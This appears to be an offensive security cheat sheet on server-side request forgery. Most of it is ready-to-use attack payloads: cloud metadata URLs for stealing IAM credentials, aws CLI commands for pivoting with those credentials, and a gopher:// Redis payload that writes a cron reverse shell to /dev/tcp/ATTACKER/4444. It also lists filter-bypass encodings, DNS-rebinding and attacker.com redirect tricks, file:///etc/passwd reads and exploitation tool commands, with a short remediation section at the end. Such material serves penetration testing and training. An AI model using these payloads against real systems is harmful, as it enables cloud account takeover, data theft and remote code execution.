# Server-Side Request Forgery (SSRF)

SSRF lets an attacker coerce the server-side application into making HTTP (or other-protocol) requests to an arbitrary destination of the attacker's choosing. It is the #1 vector for breaching cloud environments: SSRF against the instance metadata service (IMDS) routinely converts a low-severity bug into full cloud account takeover. Ranked in the OWASP Top 10 (A10:2021-SSRF).

---

## Impact

- **Cloud credential theft** — read IAM creds from `169.254.169.254` → assume role → pivot into the whole AWS/GCP/Azure account.
- **Internal network access** — reach services bound to localhost / RFC1918 that are firewalled from the internet (admin panels, databases, Redis, Elasticsearch, Kubernetes API).
- **Protocol smuggling** — `gopher://` / `dict://` to talk to Redis, MySQL, FastCGI, SMTP, Memcached → RCE.
- **Port scanning / service discovery** of the internal network.
- **Bypass of IP allowlists** for sensitive functionality.

---

## Detection

### Where SSRF lives

```
# URL / fetch parameters
?url=  ?uri=  ?path=  ?dest=  ?redirect=  ?return=  ?next=  ?data=
?reference=  ?site=  ?html=  ?val=  ?validate=  ?domain=  ?callback=
?feed=  ?host=  ?port=  ?to=  ?out=  ?view=  ?dir=  ?show=  ?navigation=
?open=  ?continue=  ?image=  ?img=  ?avatar=  ?source=  ?file=  ?document=
```

### Functionality that fetches remote content

- Webhooks / callback URLs
- PDF / screenshot / thumbnail / image-resize generators (headless Chrome, wkhtmltopdf, ImageMagick)
- URL preview / link unfurl (chat apps, social cards via OpenGraph)
- File import-from-URL ("import from Google", "fetch avatar from URL")
- XML parsers (SSRF via XXE — see xxe.md)
- SSO / OAuth / OpenID redirect and JWKS-fetch endpoints
- Document converters, RSS readers, proxy endpoints, health-check / "test connection" buttons

### Confirming it (out-of-band)

Always confirm blind SSRF with an OOB collaborator (Burp Collaborator, `interactsh`, or your own logged server):

```bash
# Stand up a quick logging listener
python3 -m http.server 80
# or interactsh-client for DNS + HTTP
interactsh-client

# Inject your unique callback domain
curl "https://TARGET/api/fetch?url=http://xxxxx.oast.fun/$(whoami)"
```

A **DNS hit with no HTTP hit** means the server resolved but couldn't connect (egress firewall) — still SSRF, often still exploitable internally. **HTTP hit** confirms full request control.

---

## Exploitation

### 1. Basic internal access

```
http://localhost/admin
http://localhost:80   http://localhost:8080   http://localhost:6379
http://127.0.0.1/
http://[::1]/          (IPv6 loopback)
http://0.0.0.0:8080/
```

### 2. Cloud metadata endpoints (the big win)

```bash
# --- AWS (IMDSv1 — no token required) ---
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# ECS task role credentials (very common in containers)
http://169.254.170.2/v2/credentials/<GUID>
# The GUID comes from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# --- GCP (requires Metadata-Flavor: Google header) ---
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
# header: Metadata-Flavor: Google   (or X-Google-Metadata-Request: True)

# --- Azure (requires Metadata: true header, IMDS) ---
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# --- DigitalOcean / Oracle / Alibaba / Kubernetes ---
http://169.254.169.254/metadata/v1/   (DigitalOcean)
http://100.100.100.200/latest/meta-data/   (Alibaba)
https://kubernetes.default.svc/   (k8s API, with SA token)
```

Once you have AWS creds, configure and pivot:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name <ROLE>
```

### 3. IMDSv2 — current (2025) reality

IMDSv2 requires a **session token obtained via a PUT** with a custom header, then sent on every GET. Pure GET-only SSRF cannot reach IMDSv2:

```bash
# Step 1 (PUT) — needs an SSRF that can change method + add header
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2 (GET)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

When IMDSv2 is enforced, hunt for SSRF primitives that let you control the HTTP method and headers (e.g. webhook endpoints that forward your headers, or full-request-control bugs). Since 2025, mass-exploitation campaigns specifically targeted instances where **IMDSv1 was still enabled** alongside SSRF.

### 4. Protocol smuggling → RCE (gopher/dict)

The `gopher://` scheme lets you send arbitrary bytes to a TCP service — this is how SSRF becomes RCE against Redis, MySQL, FastCGI, SMTP, etc. Use **Gopherus** to generate payloads:

```bash
gopherus --exploit redis        # write a cron / webshell / SSH key to disk
gopherus --exploit fastcgi      # PHP-FPM RCE via SCRIPT_FILENAME
gopherus --exploit mysql
gopherus --exploit smtp
gopherus --exploit zabbix
gopherus --exploit pgsql
gopherus --exploit memcached
```

Example Redis-via-gopher to drop a cron reverse shell (URL-encoded once for the SSRF param):

```
gopher://127.0.0.1:6379/_%0D%0AFLUSHALL%0D%0Aset%201%20"\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n\n"%0D%0Aconfig%20set%20dir%20/var/spool/cron/%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A
```

`dict://` is handy for talking to single-line text protocols / banner grabbing:

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```

---

## Filter / SSRF-protection bypasses

Defenders block `localhost`, `127.0.0.1`, `169.254.169.254`, and RFC1918. Bypass the parser/validator mismatch:

### Alternate IP representations of 127.0.0.1

```
http://127.0.0.1        http://127.1            http://127.0.1
http://0177.0.0.1       (octal)
http://0x7f.0.0.1       (hex)
http://0x7f000001       (full hex)
http://2130706433       (decimal / dword)
http://017700000001     (full octal)
http://127.0.0.1.nip.io
http://localtest.me     (resolves to 127.0.0.1)
http://0/               http://0.0.0.0/
http://[::]             http://[0:0:0:0:0:ffff:127.0.0.1]
http://①②⑦.0.0.1       (unicode/enclosed alphanumerics)
```

### Alternate representations of 169.254.169.254

```
http://169.254.169.254
http://[::ffff:169.254.169.254]
http://0xA9.0xFE.0xA9.0xFE
http://0251.0376.0251.0376      (octal)
http://2852039166               (decimal)
http://425.510.425.510          (overflow / mod-256 — some parsers accept)
http://169.254.169.254.nip.io
http://metadata.google.internal (DNS name → 169.254.169.254 on GCP)
```

### DNS rebinding & redirect tricks

```
# Domain that resolves to a public IP at validation time, internal IP at fetch time
http://rebind.attacker.com   (TTL 0, flips 1.2.3.4 -> 169.254.169.254)
# Use: https://lock.cmpxchg8.com/rebinder.html or a custom rebinding server

# Open redirect on an allowlisted host bounces you internally
https://allowed.com/redirect?to=http://169.254.169.254/
# 30x chaining — point at a server you control that 302s to the metadata IP
http://attacker.com/r  ->  Location: http://169.254.169.254/latest/meta-data/
```

### URL-parser confusion (host part is ambiguous)

```
http://expected-host@169.254.169.254/         (userinfo trick)
http://169.254.169.254#expected-host/
http://169.254.169.254\@expected-host/
http://expected-host%2523@169.254.169.254/
http://169.254.169.254%2F%2E%2E%2F            (mixed encoding)
http://[::169.254.169.254]                    (IPv6-mapped)
http://①.②.③.④                                (fullwidth)
# CR/LF or whitespace to confuse the parser
http://169.254.169.254%0d%0aHost:%20attacker
```

### Scheme bypasses

```
file:///etc/passwd
file:///c:/windows/win.ini
gopher://...   dict://...   ftp://...   ldap://...   tftp://...   sftp://...
# If only http(s) allowed, try jar:, netdoc:, mailto:, php:// (in PHP contexts)
```

---

## Blind SSRF amplification

When you get no response body back:

```bash
# 1. Timing oracle: open vs closed internal port differ in response time
?url=http://127.0.0.1:80   (fast)  vs  ?url=http://127.0.0.1:81   (timeout)

# 2. Error-message oracle: "connection refused" vs "200 OK" leaks port state

# 3. Force the internal service to call back to you via a vuln it has
#    (e.g. SSRF -> internal Jenkins -> Groovy script console -> RCE -> shell to you)
```

Even blind SSRF reaching metadata is critical if you can chain it (gopher to Redis, or hit an internal endpoint that reflects). Always report the OOB DNS/HTTP proof.

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Collaborator** | OOB DNS/HTTP confirmation of blind SSRF |
| **interactsh** (`interactsh-client`) | Free self-hosted OOB collaborator |
| **Gopherus** | Generate `gopher://` payloads (Redis, FastCGI, MySQL, SMTP, ...) |
| **SSRFmap** | Automate SSRF exploitation modules (AWS, Redis, gopher, port scan) |
| **ssrf-king** / Burp extensions | Auto-tag SSRF-prone params |
| **nuclei** | `-t ssrf/` templates for fast detection |
| **dnsrebind / rbndr** | DNS rebinding for TOCTOU bypass |
| **interlace + ffuf** | Fuzz the `url=` param with IP/encoding wordlist |

```bash
# SSRFmap example
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,aws

# nuclei
nuclei -u https://TARGET -t http/vulnerabilities/ -tags ssrf
```

---

## Remediation

- **Allowlist, never blocklist** — accept only an explicit list of domains/IPs; resolve and re-check the IP *after* DNS resolution (defeats rebinding) and pin it for the connection.
- Reject non-http(s) schemes (`file`, `gopher`, `dict`, `ftp`, `data`) at the parser before any connection.
- Block link-local (`169.254.0.0/16`), loopback, and RFC1918 ranges; do it on the resolved IP, including IPv6 forms.
- **Enforce IMDSv2** (`HttpTokens: required`) and set `HttpPutResponseHopLimit: 1` on all EC2 instances.
- Don't return raw upstream responses to the client; strip/normalize.
- Run fetchers in an egress-restricted network segment (no route to metadata or internal subnets).
- Disable HTTP redirect following, or re-validate every hop.

---

## Payload Cheatsheet

```text
# Confirm (OOB)
http://COLLAB/                         (HTTP+DNS hit)
# Loopback
http://127.0.0.1/  http://127.1/  http://0/  http://[::1]/
# Decimal / hex / octal 127.0.0.1
http://2130706433/  http://0x7f000001/  http://0177.0.0.1/
# AWS IMDS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AWS decimal
http://2852039166/latest/meta-data/
# GCP (+header Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Userinfo bypass
http://allowed.com@169.254.169.254/
# nip.io
http://169.254.169.254.nip.io/
# Redirect chain
http://attacker.com/redirect  -> 302 http://169.254.169.254/
# file scheme
file:///etc/passwd
# gopher -> redis RCE (use Gopherus to build)
gopher://127.0.0.1:6379/_<crlf-encoded redis commands>
```

---

## References

- PortSwigger Web Security Academy — SSRF: https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings — SSRF: https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/
- HackTricks — SSRF: https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- YesWeHack — Bug Bounty guide to SSRF: https://www.yeswehack.com/learn-bug-bounty/server-side-request-forgery-ssrf
- Mastering SSRF Exploitation in 2025: https://squidhacker.com/2025/05/mastering-server-side-request-forgery-ssrf-exploitation-in-2025/
- SSRF Cheat Sheet 2025: https://zus3c.medium.com/ssrf-cheat-sheet-2025-latest-exploits-defenses-real-world-case-studies-6f028d121455
- EC2 IMDS exploitation campaign (2025): https://cybersecuritynews.com/hackers-exploiting-ec2-instance-metadata-vulnerability/
- Gopherus: https://github.com/tarunkant/Gopherus
- SSRFmap: https://github.com/swisskyrepo/SSRFmap
